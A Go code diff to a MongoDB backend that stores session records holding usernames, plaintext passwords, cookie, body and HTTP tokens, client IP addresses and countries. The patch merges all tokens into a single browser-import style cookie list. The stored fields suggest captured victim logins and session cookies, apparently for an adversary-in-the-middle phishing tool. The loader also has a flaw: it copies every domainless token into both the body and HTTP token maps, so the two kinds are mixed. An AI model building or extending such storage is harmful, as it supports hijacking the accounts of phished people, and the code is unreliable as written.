@@ -118,33 +118,63 @@ func (m *MongoDatabase) Close() error {
 	return m.client.Disconnect(m.ctx)
 }
 
-// convertToMongoSession يحول كائن Session التقليدي إلى كائن MongoSession
-func convertToMongoSession(s *Session) *MongoSession {
-	// طباعة البيانات قبل التحويل
-	log.Debug("[MongoDB] تحويل Session إلى MongoSession:")
-	log.Debug("[MongoDB] - Session.CountryCode: '%s'", s.CountryCode)
-	log.Debug("[MongoDB] - Session.Country: '%s'", s.Country)
-
-	// تحويل CookieTokens
-	cookieTokens := make(map[string][]map[string]interface{})
+// Helper: Combine all tokens into a single slice for MongoDB
+func combineAllTokens(s *Session) []map[string]interface{} {
+	var allTokens []map[string]interface{}
+	// Add cookies
 	for domain, tokens := range s.CookieTokens {
-		cookieTokens[domain] = []map[string]interface{}{}
 		for _, token := range tokens {
-			hostOnly := !strings.HasPrefix(domain, ".")
-			cookieObj := map[string]interface{}{
+			allTokens = append(allTokens, map[string]interface{}{
 				"name":   token.Name,
 				"value":  token.Value,
 				"domain": domain,
 				"path":   token.Path,
 				"expirationDate": token.ExpirationDate,
 				"httpOnly":       token.HttpOnly,
-				"hostOnly":       hostOnly,
+				"hostOnly":       !strings.HasPrefix(domain, "."),
 				"secure":         false,
 				"session":        false,
-			}
-			cookieTokens[domain] = append(cookieTokens[domain], cookieObj)
+			})
 		}
 	}
+	// Add body tokens
+	for k, v := range s.BodyTokens {
+		allTokens = append(allTokens, map[string]interface{}{
+			"name":   k,
+			"value":  v,
+			"domain": "",
+			"path":   "",
+			"expirationDate": 0,
+			"httpOnly":       false,
+			"hostOnly":       false,
+			"secure":         false,
+			"session":        false,
+		})
+	}
+	// Add http tokens
+	for k, v := range s.HttpTokens {
+		allTokens = append(allTokens, map[string]interface{}{
+			"name":   k,
+			"value":  v,
+			"domain": "",
+			"path":   "",
+			"expirationDate": 0,
+			"httpOnly":       false,
+			"hostOnly":       false,
+			"secure":         false,
+			"session":        false,
+		})
+	}
+	return allTokens
+}
+
+// convertToMongoSession: store all tokens in a single list
+func convertToMongoSession(s *Session) *MongoSession {
+	log.Debug("[MongoDB] تحويل Session إلى MongoSession:")
+	log.Debug("[MongoDB] - Session.CountryCode: '%s'", s.CountryCode)
+	log.Debug("[MongoDB] - Session.Country: '%s'", s.Country)
+
+	allTokens := combineAllTokens(s)
 
 	mongoSession := &MongoSession{
 		Id:           s.Id,
@@ -153,9 +183,9 @@ func convertToMongoSession(s *Session) *MongoSession {
 		Username:     s.Username,
 		Password:     s.Password,
 		Custom:       s.Custom,
-		BodyTokens:   s.BodyTokens,
-		HttpTokens:   s.HttpTokens,
-		CookieTokens: cookieTokens,
+		BodyTokens:   nil, // not needed, all in cookie_tokens
+		HttpTokens:   nil, // not needed, all in cookie_tokens
+		CookieTokens: map[string][]map[string]interface{}{ "all": allTokens },
 		SessionId:    s.SessionId,
 		UserAgent:    s.UserAgent,
 		RemoteAddr:   s.RemoteAddr,
@@ -165,29 +195,26 @@ func convertToMongoSession(s *Session) *MongoSession {
 		CountryCode:  s.CountryCode,
 		Country:      s.Country,
 	}
-	
-	// طباعة البيانات بعد التحويل
 	log.Debug("[MongoDB] بعد التحويل:")
 	log.Debug("[MongoDB] - MongoSession.CountryCode: '%s'", mongoSession.CountryCode)
 	log.Debug("[MongoDB] - MongoSession.Country: '%s'", mongoSession.Country)
-
 	return mongoSession
 }
 
-// convertFromMongoSession يحول كائن MongoSession إلى كائن Session التقليدي
+// convertFromMongoSession: load all tokens from the single list
 func convertFromMongoSession(ms *MongoSession) *Session {
-	// طباعة البيانات قبل التحويل
 	log.Debug("[MongoDB] تحويل MongoSession إلى Session:")
 	log.Debug("[MongoDB] - MongoSession.CountryCode: '%s'", ms.CountryCode)
 	log.Debug("[MongoDB] - MongoSession.Country: '%s'", ms.Country)
 
-	// تحويل CookieTokens
 	cookieTokens := make(map[string]map[string]*CookieToken)
-	for domain, tokens := range ms.CookieTokens {
-		cookieTokens[domain] = make(map[string]*CookieToken)
-		for _, token := range tokens {
+	bodyTokens := make(map[string]string)
+	httpTokens := make(map[string]string)
+	if all, ok := ms.CookieTokens["all"]; ok {
+		for _, token := range all {
 			name := getStringValue(token["name"])
 			value := getStringValue(token["value"])
+			domain := getStringValue(token["domain"])
 			path := getStringValue(token["path"])
 			httpOnly := getBoolValue(token["httpOnly"])
 			expirationDate := int64(0)
@@ -202,18 +229,26 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 				case float32:
 					expirationDate = int64(v)
 				case string:
-					// try to parse string to int64
 					if parsed, err := strconv.ParseInt(v, 10, 64); err == nil {
 						expirationDate = parsed
 					}
 				}
 			}
-			cookieTokens[domain][name] = &CookieToken{
-				Name:           name,
-				Value:          value,
-				Path:           path,
-				HttpOnly:       httpOnly,
-				ExpirationDate: expirationDate,
+			if domain != "" {
+				if _, ok := cookieTokens[domain]; !ok {
+					cookieTokens[domain] = make(map[string]*CookieToken)
+				}
+				cookieTokens[domain][name] = &CookieToken{
+					Name:           name,
+					Value:          value,
+					Path:           path,
+					HttpOnly:       httpOnly,
+					ExpirationDate: expirationDate,
+				}
+			} else {
+				// If no domain, treat as body or http token
+				bodyTokens[name] = value
+				httpTokens[name] = value
 			}
 		}
 	}
@@ -225,8 +260,8 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 		Username:     ms.Username,
 		Password:     ms.Password,
 		Custom:       ms.Custom,
-		BodyTokens:   ms.BodyTokens,
-		HttpTokens:   ms.HttpTokens,
+		BodyTokens:   bodyTokens,
+		HttpTokens:   httpTokens,
 		CookieTokens: cookieTokens,
 		SessionId:    ms.SessionId,
 		UserAgent:    ms.UserAgent,
@@ -237,26 +272,18 @@ func convertFromMongoSession(ms *MongoSession) *Session {
 		CountryCode:  ms.CountryCode,
 		Country:      ms.Country,
 	}
-	
-	// طباعة البيانات بعد التحويل
 	log.Debug("[MongoDB] بعد التحويل:")
 	log.Debug("[MongoDB] - Session.CountryCode: '%s'", session.CountryCode)
 	log.Debug("[MongoDB] - Session.Country: '%s'", session.Country)
-	
-	// إضافة البيانات للحقول المخصصة كاحتياط إضافي
 	if session.Custom == nil {
 		session.Custom = make(map[string]string)
 	}
-	
-	// نسخ بيانات البلد إلى الحقول المخصصة
 	if ms.CountryCode != "" {
 		session.Custom["country_code_backup"] = ms.CountryCode
 	}
-	
 	if ms.Country != "" {
 		session.Custom["country_backup"] = ms.Country
 	}
-
 	return session
 }
 
@@ -515,42 +542,23 @@ func (m *MongoDatabase) UpdateSessionCustom(sid, name, value string) error {
 	return err
 }
 
-// UpdateSessionCookieTokens يحدث رموز الكوكيز للجلسة
-func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
-	log.Debug("[MongoDB] محاولة تحديث الكوكيز للجلسة: %s", sid)
-
-	// تحويل الكوكيز من Session (in-memory) إلى تنسيق MongoDB
-	cookieTokens := make(map[string][]map[string]interface{})
-	for domain, domainTokens := range tokens {
-		for _, token := range domainTokens {
-			cookieObj := map[string]interface{}{
-				"name":   token.Name,
-				"value":  token.Value,
-				"domain": domain,
-				"path":   token.Path,
-				"expirationDate": token.ExpirationDate,
-				"httpOnly":       token.HttpOnly,
-				"hostOnly":       !strings.HasPrefix(domain, "."),
-				"secure":         false,
-				"session":        false,
-			}
-			cookieTokens[domain] = append(cookieTokens[domain], cookieObj)
-		}
-	}
-
+// UpdateSessionCookieTokens: save all tokens as a single list
+func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken, bodyTokens map[string]string, httpTokens map[string]string) error {
+	log.Debug("[MongoDB] محاولة تحديث كل التوكنز للجلسة: %s", sid)
+	allTokens := combineAllTokens(&Session{CookieTokens: tokens, BodyTokens: bodyTokens, HttpTokens: httpTokens})
 	now := time.Now().UTC().Unix()
 	update := bson.M{
 		"$set": bson.M{
-			"cookie_tokens": cookieTokens,
+			"cookie_tokens": map[string][]map[string]interface{}{ "all": allTokens },
 			"update_time":   now,
 		},
 	}
 	result, err := m.sessionsColl.UpdateOne(m.ctx, bson.M{"session_id": sid}, update)
 	if err != nil {
-		log.Error("[MongoDB] فشل تحديث الكوكيز: %v", err)
+		log.Error("[MongoDB] فشل تحديث التوكنز: %v", err)
 		return err
 	}
-	log.Success("[MongoDB] تم تحديث الكوكيز بنجاح، عدد الوثائق المعدلة: %d", result.ModifiedCount)
+	log.Success("[MongoDB] تم تحديث كل التوكنز بنجاح، عدد الوثائق المعدلة: %d", result.ModifiedCount)
 	return nil
 }
 
@@ -630,9 +638,9 @@ func (m *MongoDatabase) SetSessionCustom(sid string, name, value string) error {
 	return m.UpdateSessionCustom(sid, name, value)
 }
 
-// SetSessionCookieTokens يحدث رموز الكوكيز للجلسة
-func (m *MongoDatabase) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken) error {
-	return m.UpdateSessionCookieTokens(sid, tokens)
+// SetSessionCookieTokens: update all tokens at once
+func (m *MongoDatabase) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken, bodyTokens map[string]string, httpTokens map[string]string) error {
+	return m.UpdateSessionCookieTokens(sid, tokens, bodyTokens, httpTokens)
 }
 
 // UpdateSessionCountryInfo يحدث معلومات البلد للجلسة
